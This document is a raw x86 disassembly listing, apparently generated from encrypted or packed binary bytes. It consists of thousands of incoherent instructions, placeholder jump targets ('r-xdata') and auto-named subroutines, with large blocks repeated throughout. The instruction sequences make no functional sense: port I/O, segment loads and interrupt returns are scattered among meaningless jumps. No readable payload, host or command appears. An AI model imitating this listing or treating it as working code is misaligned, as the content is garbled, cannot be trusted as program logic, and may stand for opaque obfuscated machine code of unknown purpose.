scasb [ edi ]
pop ss
bound ebp [ esi + 0x11f6020f ]
adc al 0x14
lea esp [ edx - 0x1 ]
0xe41bd0ad 0xf69
fldpi
jmp r-xdata
and [ eax + 0x2b6eebeb ] ch
in al 0x6f
test eax 0x66ebebe5
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
jmp r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
adc al 0xe4
outsd
adc al 0x14
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
adc al 0x14
jpo r-xdata
push esp
jpo r-xdata
jmp 0x3549b958
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46ca11
sub esp [ edx ]
sub [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
out dx eax
pushad
sbb eax [ edx ]
aas
std
jmp r-xdata
pushad
xchg edi eax
iretd
add ch dl
imul ebx
jmp r-xdata
jpo r-xdata
sub esp esp
jpo r-xdata
outsd
jpo r-xdata
in eax 0xeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
shr [ edi + 0x28a3efcf ] 0x7b
jpo r-xdata
sub edx 0xebc0a702
jmp r-xdata
jmp r-xdata
jpo r-xdata
scasb [ edi ]
jmp r-xdata
mov esp 0xa702ea81
shr bl 0xeb
in al 0x6f
jge r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
add dl bh
sti
jmp r-xdata
xor ecx 0xb7d14b8
jpo r-xdata
jpo r-xdata
jmp r-xdata
fucomip st3
jmp r-xdata
call 0x30b5b658
in al 0x6f
jpo r-xdata
lea esp [ edx - 0x52 ]
xor eax [ edx ]
0xbeebebf7 0x760
adc al 0xeb
jmp r-xdata
jmp r-xdata
stc
imul bl
jmp r-xdata
jmp r-xdata
jpo r-xdata
jge r-xdata
adc al 0x7d
or ebp ebx
jmp r-xdata
push ebx
test al 0xeb
jmp r-xdata
scasb [ edi ]
pop ss
bound ebp [ esi + 0x11f6020f ]
adc al 0x14
lea esp [ edx - 0x1 ]
0xe41bd0ad 0xf69
fldpi
jmp r-xdata
and [ eax + 0x2b6eebeb ] ch
in al 0x6f
test eax 0x66ebebe5
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
jmp r-xdata
scasd [ edi ]
iretd
adc al 0x7b
jpo r-xdata
adc al 0xe4
outsd
jmp r-xdata
jpo r-xdata
adc al 0xfe
inc edi
jmp r-xdata
push ss
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor eax ebp
jmp sub_46ca5e
outsb
scasd [ edi ]
iretd
bound ebp [ edi - 0x4fd0831 ]
push ss
adc al 0x14
jpo r-xdata
scasb [ edi ]
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x65
loope r-xdata
pop es
jg r-xdata
jpo r-xdata
jmp r-xdata
mov ebp 0xebd9c202
jmp r-xdata
lodsd [ esi ]
jmp r-xdata
add [ ebp - 0x8519d73 ] 0x628d2960
scasb [ edi ]
jpo r-xdata
jmp sub_46caa6
psubusw mm5 mm3
jmp sub_46caeb
inc edi
jmp r-xdata
jmp r-xdata
and ch [ eax ]
jpo r-xdata
scasd [ edi ]
jmp r-xdata
add dl [ esi ]
dec edi
add edx [ ebx - 0x58 ]
jmp r-xdata
or eax ebp
jmp r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
cmc
mov bl 0x2
dec ch
jmp r-xdata
lea esp [ edx - 0x52 ]
mul [ eax + 0x29 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jmp r-xdata
adc al 0x7d
out dx eax
jpo r-xdata
mov dh 0x57
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
bound esi [ esi - 0x516ffce5 ]
insd
sbb eax 0xad021414
int1
jmp r-xdata
jmp r-xdata
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp sub_46cbcc
jpo r-xdata
xchg esi eax
adc [ esp + edx ] edx
jpo r-xdata
jmp r-xdata
outsd
mov ah 0xef
xor ah ah
outsd
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jge r-xdata
add ecx [ eax + eax * 8 + 0x2b2ebeb ]
arpl ax sp
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add bh dh
jmp r-xdata
add ah [ esi + 0x7b141410 ]
jpo r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
jpo r-xdata
jmp r-xdata
int1
pushad
int 0xeb
jmp r-xdata
bound ebp [ esi - 0x72d69f09 ]
bound ebp [ esi - 0x1fd4c0b ]
jmp r-xdata
mov esp 0x31bb662
nop
scasb [ edi ]
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
add esi esi
stosb [ edi ]
jmp r-xdata
mul [ eax - 0x5b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
adc al 0x14
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
adc al 0x14
jpo r-xdata
push esp
jpo r-xdata
jmp 0x3549b958
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46caa6
jpo r-xdata
outsb
jpo r-xdata
jpo r-xdata
xchg edi eax
push ss
adc al 0x14
mov ebx 0xeba98d02
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
add ah [ ecx + 0x1d ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jmp sub_46caa0
dec ch
jmp r-xdata
sub ebp [ eax ]
jpo r-xdata
sbb eax 0x7b7b1414
jpo r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov dh 0x57
mov bl 0x81
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
add bh dh
int 0xeb
jmp r-xdata
jpo r-xdata
adc al 0x83
out dx eax
0x7d14ebeb 0xeb53
scasw [ edi ]
jpo r-xdata
sub eax 0xeba9a903
jmp r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
sub ebx 0xeb477d14
jmp r-xdata
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp r-xdata
sub edi 0xffffffea
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
mov esp 0xebf4c203
jmp r-xdata
jmp r-xdata
jpo r-xdata
pushad
jmp r-xdata
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
sub eax 0x57b6628d
adc al 0x14
jpo r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
mul [ eax - 0x5b ]
cmc
jmp r-xdata
iretd
scasd [ edi ]
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
bound esi [ esi - 0x72cf27e9 ]
bound esi [ esi - 0x2559fdeb ]
jmp r-xdata
int1
pushad
push esp
jpo r-xdata
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
add esi esi
stosb [ edi ]
jmp r-xdata
jmp 0x3549b958
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46caca
push 0x76a130f
jg r-xdata
inc edi
jmp r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x7d
insd
sbb eax 0xad021414
int1
jmp r-xdata
outsd
mov ah 0xef
jmp r-xdata
jmp r-xdata
xor ah ah
outsd
xor eax ebp
jmp sub_46ca5e
sub_46cb02
sub ebp ebx
jmp r-xdata
mov ah 0xb5
sub [ ebx + 0x7b ] bh
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x65
loope r-xdata
lodsd [ esi ]
jmp r-xdata
add [ ebp - 0x8519d73 ] 0x628d2960
scasb [ edi ]
jpo r-xdata
psubusw mm5 mm3
jmp sub_46caa6
jmp sub_46caeb
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
cmc
mov bl 0x2
dec ch
jmp r-xdata
lea esp [ edx - 0x52 ]
mul [ eax + 0x29 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
mov dh 0x57
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
bound esi [ esi - 0x516ffce5 ]
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp sub_46cbcc
jpo r-xdata
xchg esi eax
adc [ esp + edx ] edx
jpo r-xdata
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jge r-xdata
add ecx [ eax + eax * 8 + 0x2b2ebeb ]
arpl ax sp
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add bh dh
jmp r-xdata
add ah [ esi + 0x7b141410 ]
jpo r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
jpo r-xdata
jmp r-xdata
int1
pushad
int 0xeb
jmp r-xdata
bound ebp [ esi - 0x72d69f09 ]
bound ebp [ esi - 0x1fd4c0b ]
jmp r-xdata
mov esp 0x31bb662
nop
scasb [ edi ]
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
add esi esi
stosb [ edi ]
jmp r-xdata
mul [ eax - 0x5b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
adc al 0x14
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
adc al 0x14
jpo r-xdata
push esp
jpo r-xdata
jmp 0x3549b958
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46cba5
add al [ edi + 0x7bebebad ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
add ah [ ecx + 0x1d ]
adc al 0x14
jpo r-xdata
jpo r-xdata
dec ch
jmp r-xdata
sub ebp [ eax ]
jpo r-xdata
sbb eax 0x7b7b1414
jpo r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov dh 0x57
mov bl 0x81
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
add bh dh
int 0xeb
jmp r-xdata
jpo r-xdata
adc al 0x83
out dx eax
0x7d14ebeb 0xeb53
scasw [ edi ]
jpo r-xdata
sub eax 0xeba9a903
jmp r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
sub ebx 0xeb477d14
jmp r-xdata
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp r-xdata
sub edi 0xffffffea
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
mov esp 0xebf4c203
jmp r-xdata
jmp r-xdata
jpo r-xdata
pushad
jmp r-xdata
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
sub eax 0x57b6628d
adc al 0x14
jpo r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
mul [ eax - 0x5b ]
cmc
jmp r-xdata
iretd
scasd [ edi ]
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
bound esi [ esi - 0x72cf27e9 ]
bound esi [ esi - 0x2559fdeb ]
jmp r-xdata
int1
pushad
push esp
jpo r-xdata
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
add esi esi
stosb [ edi ]
jmp r-xdata
jmp 0x3549b958
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46cc07
jpo r-xdata
outsd
scasb [ edi ]
jpo r-xdata
jmp r-xdata
fldpi
jmp r-xdata
pushad
pop es
mov edx 0xeb178e68
add al [ ebx ]
jecxz r-xdata
jpo r-xdata
add bh dh
int 0xeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
and ah ah
lea esp [ edx - 0x52 ]
cmc
mov bl 0x2
dec ch
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
mov dh 0x57
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
mov bl 0x81
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
mul [ eax - 0x5b ]
fsubp st3
jpo r-xdata
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in eax 0xeb
jmp r-xdata
jpo r-xdata
int1
pushad
add esi esi
stosb [ edi ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
adc al 0x14
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
adc al 0x14
jpo r-xdata
push esp
jpo r-xdata
jmp 0x3549b958
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46cdc0
sub esp [ edx ]
sub [ ebp + 0x2559662 ] cl
sub dl bl
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46cdeb
lea esp [ edx - 0x52 ]
adc eax [ ecx + 0x628db393 ]
scasb [ edi ]
adc [ ecx - 0x24fd4c72 ] eax
sbb [ esp + edx ] edx
jpo r-xdata
jmp r-xdata
bound esp [ esi + 0x6082812d ]
xor eax 0xb6628db2
pop edi
pushad
xor eax [ edx ]
fist [ 0x7b7b1414 ]
jpo sub_46ce92
jmp r-xdata
pushad
and ecx [ ebp - 0x4df8599e ]
xor [ ebx + 0x1fae628d ] 0xebee3b02
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
jmp r-xdata
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
mul [ eax - 0x5b ]
retn
sub_46ce82
pushad
adc eax 0xebd04b02
jmp r-xdata
pop ss
adc [ esp + edx ] dl
fsubr [ ebx ]
mov ah 0x2
rcr edi 0xeb
jmp r-xdata
jmp r-xdata
imul ebp ebx 0xffffffeb
jmp r-xdata
jmp r-xdata
bound ebp [ esi - 0x20522fd9 ]
add ah [ ebp + 0x7bebebc0 ]
bound ebp [ edi - 0x147c3c31 ]
jmp r-xdata
fild [ edx ]
movsd [ edi ] [ esi ]
shr bl 0xeb
jpo r-xdata
adc al 0x14
add dh [ esp + ebp * 8 + 0x2bd8ebeb ]
stosd [ edi ]
add ch [ edx ]
adc eax 0x7b7b1414
scasd [ edi ]
iretd
bound ebp [ ebp + 0x37 ]
jmp r-xdata
jge r-xdata
jmp r-xdata
adc al 0x14
mov esi 0xd7020760
jmp r-xdata
fucomi st3
jmp r-xdata
adc al 0x9e
pop ss
add dl [ 0x7bebebc5 ]
jpo r-xdata
sub dl [ 0x7b7b1414 ]
sub_46ce92
mov esp 0x207b662
sub eax 0x7b14141b
jpo r-xdata
sti
bound ebp [ ebp + 0xf ]
jmp r-xdata
pushad
pop es
mov edx 0xeb178e68
adc al 0x9e
out 0x2 eax
into
adc [ esp + edx ] edx
add ecx [ ecx + 0x68ebebe3 ]
das
sub_46ceca
add al [ esi + ebx + 0x7b7b1414 ]
jpo r-xdata
jpo r-xdata
and ch [ eax ]
bound ebp [ esi - 0x20522fd9 ]
add ah [ ebp + 0x7bebebc0 ]
bound ebp [ edi - 0x147c3c31 ]
jpo r-xdata
in al 0x6e
out 0xcc al
jmp r-xdata
jmp r-xdata
in eax 0xeb
jmp sub_46cebb
bound ebp [ esi - 0x7d7e4cff ]
lea esp [ edx - 0x52 ]
pop es
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
add eax 0xb08e81b3
bound edx [ esi - 0x7bfd4bf7 ]
push ds
adc al 0x14
jpo r-xdata
fild [ edx ]
movsd [ edi ] [ esi ]
shr bl 0xeb
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb eax [ ecx - 0x28dffd67 ]
jmp r-xdata
sbb [ ebp + 0x5ae628d ] 0xb08e81b3
jpo r-xdata
jpo r-xdata
adc al 0x14
add dh [ esp + ebp * 8 + 0x2bd8ebeb ]
stosd [ edi ]
add ch [ edx ]
adc eax 0x7b7b1414
scasd [ edi ]
iretd
mov ch 0xb0
bound ebp [ ebp + 0x37 ]
jmp r-xdata
jge r-xdata
jmp r-xdata
adc al 0x14
mov esi 0xd7020760
jmp r-xdata
fucomi st3
jmp r-xdata
adc al 0x9e
pop ss
add dl [ 0x7bebebc5 ]
jpo r-xdata
sub dl [ 0x7b7b1414 ]
sub_46cf19
adc ah [ eax + 0x3a ]
lea esp [ edx - 0x6a ]
sbb [ ebp + 0x2d5be62 ] ecx
jpe r-xdata
jmp r-xdata
jmp r-xdata
aaa
push ss
adc al 0x14
bound edi [ edi - 0x1d ]
imul ebp ebx 0xffffffeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x20522fd9 ]
add ah [ ebp + 0x7bebebc0 ]
bound ebp [ edi - 0x147c3c31 ]
jpo r-xdata
mov esp 0x81bce981
jmp 0xffffffffec32bb20
pushad
jmp r-xdata
jmp sub_46d065
pop es
out 0xb8 eax
mov esp 0x2bc14d8
jecxz r-xdata
fild [ edx ]
movsd [ edi ] [ esi ]
shr bl 0xeb
jpo r-xdata
add ah bl
std
jmp r-xdata
adc al 0x14
add dh [ esp + ebp * 8 + 0x2bd8ebeb ]
stosd [ edi ]
add ch [ edx ]
adc eax 0x7b7b1414
scasd [ edi ]
iretd
jmp r-xdata
bound ebp [ ebp + 0x37 ]
jmp r-xdata
jge r-xdata
sbb eax [ ebx ]
aas
aad 0xeb
jmp r-xdata
jmp r-xdata
adc al 0x14
mov esi 0xd7020760
jmp r-xdata
jmp r-xdata
fucomi st3
jmp r-xdata
adc al 0x9e
pop ss
add dl [ 0x7bebebc5 ]
jpo r-xdata
sub dl [ 0x7b7b1414 ]
scasb [ edi ]
sbb eax [ ecx - 0x28dffd67 ]
jmp r-xdata
sbb [ ebp + 0x5ae628d ] 0xb08e81b3
lea esp [ edx - 0x52 ]
sub_46cf31
lea edx [ ecx ]
adc al 0x14
jpo r-xdata
outsd
lodsb [ esi ]
cld
jmp r-xdata
jpo r-xdata
pop ds
out 0xeb eax
jpo r-xdata
pop esp
das
jmp r-xdata
adc al 0x7b
jpo r-xdata
mov al 0x22
jpo r-xdata
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sub [ edx - 0x52 ] ah
lea esp [ edx - 0x52 ]
add [ ebx + 0x628d8281 ] esi
scasb [ edi ]
pop es
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
add eax 0xb08e81b3
jmp r-xdata
mov esi 0xd7020760
shl [ esi + 0x16ee4fb ] cl
in al dx
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb [ ebp + 0x5ae628d ] 0xb08e81b3
sub dl [ esp + edx ]
adc al 0x81
jmp r-xdata
fsubp st3
jmp r-xdata
sahf
jecxz r-xdata
daa
shr [ ebp - 0x3f5afd21 ] 0x1
jmp r-xdata
sub esi [ ebp + esi * 4 + 0x622822b0 ]
scasb [ edi ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x81bce981
jmp 0xffffffffec32bb20
jmp sub_46d065
pop es
out 0xb8 eax
mov esp 0x2bc14d8
jecxz r-xdata
add ah bl
std
jmp r-xdata
jmp r-xdata
sbb eax [ ebx ]
aas
aad 0xeb
jmp r-xdata
jmp r-xdata
sbb eax [ ecx - 0x28dffd67 ]
jmp r-xdata
scasb [ edi ]
sub_46d01c
jpo r-xdata
adc al 0x14
adc al 0x81
jmp r-xdata
add bl [ eax ]
pop ss
adc al 0x14
jpo r-xdata
adc al 0x14
mov esi 0xd7020760
adc al 0x14
jpo r-xdata
adc al 0xbe
pushad
pop es
add dl bh
jpo r-xdata
outsb
mov dh 0xfb
in al 0x6e
add esi ebx
jmp sub_46d01c
sub_46d0b7
outsb
xor [ edx ] al
rcr [ edx ] 0x14
adc al 0x7b
jpo r-xdata
sahf
bound ebp [ ebp + 0x37 ]
jmp r-xdata
jge r-xdata
jmp r-xdata
adc al 0x14
mov esi 0xd7020760
jmp r-xdata
fucomi st3
jmp r-xdata
pop ss
add dl [ 0x7bebebc5 ]
jpo r-xdata
sub dl [ 0x7b7b1414 ]
jmp r-xdata
fild [ edx ]
movsd [ edi ] [ esi ]
shr bl 0xeb
jpo r-xdata
adc al 0x9e
adc al 0x14
add dh [ esp + ebp * 8 + 0x2bd8ebeb ]
stosd [ edi ]
add ch [ edx ]
adc eax 0x7b7b1414
scasd [ edi ]
iretd
sub_46d112
pushad
test al 0xdf
mov dl 0x6e
sub esp esp
outsd
sbb [ ebx ] 0x14
adc al 0x2
mov ebx [ ebx ]
adc al 0x14
jpo r-xdata
stosd [ edi ]
add ah ah
xlat
jpo r-xdata
cmc
jmp sub_46d17f
jmp r-xdata
in al 0xd7
jpo r-xdata
scasb [ edi ]
das
sub al 0xae
push fs
mov ebp 0xae2ca0a6
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
mov bl 0x8e
test [ ebp - 0x59cc51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
aaa
test [ ebp - 0x58fd595a ] edi
adc eax 0x7b7b1414
jpo r-xdata
add al 0x14
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
aas
jmp r-xdata
scasb [ edi ]
